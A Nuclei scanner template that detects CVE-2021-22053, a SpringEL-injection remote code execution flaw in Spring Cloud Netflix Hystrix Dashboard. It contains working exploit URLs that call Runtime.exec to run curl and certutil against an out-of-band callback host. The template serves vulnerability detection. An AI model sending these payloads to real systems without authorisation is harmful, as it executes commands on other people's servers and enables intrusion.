id: CVE-2021-22053

info:
  name: Spring Cloud Netflix Hystrix Dashboard <2.2.10 - Remote Code Execution
  author: forgedhallpass
  severity: high
  description: |
    Spring Cloud Netflix Hystrix Dashboard prior to version 2.2.10 is susceptible to remote code execution. Applications using both `spring-cloud-netflix-hystrix-dashboard` and `spring-boot-starter-thymeleaf` expose a way to execute code submitted within the request URI path during the resolution of view templates.  When a request is made at `/hystrix/monitor;[user-provided data]`, the path elements following `hystrix/monitor` are being evaluated as SpringEL expressions, which can lead to code execution.
  remediation: |
    Upgrade to Spring Cloud Netflix Hystrix Dashboard version 2.2.10 or later to mitigate this vulnerability.
  reference:
    - https://github.com/SecCoder-Security-Lab/spring-cloud-netflix-hystrix-dashboard-cve-2021-22053
    - https://tanzu.vmware.com/security/cve-2021-22053
    - https://nvd.nist.gov/vuln/detail/CVE-2021-22053
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2021-22053
    cwe-id: CWE-94
    epss-score: 0.63177
    epss-percentile: 0.97476
    cpe: cpe:2.3:a:vmware:spring_cloud_netflix:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: vmware
    product: spring_cloud_netflix
  tags: Spring-Cloud-Netflix,SpringBoot-Framework,SpringBoot-Actuator

http:
  - method: GET
    path:
      - '{{BaseURL}}/hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec("curl http://{{interactsh-url}}")}__::.x/'
      - '{{BaseURL}}/hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec("certutil -urlcache -split -f http://{{interactsh-url}}")}__::.x/'

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: regex
        part: interactsh_request
        regex:
          - 'curl|CertUtil'

# digest: 490a004630440220515dfefb3ea6d520742dc30e031d53f3097e55d762f887b1a632ba2c11bc802402202a84f001cb20879888a649b9d260ecb85aaae1e578eda063a1f69d74b66a53f2:922c64590222798bb761d5b6d8e72950
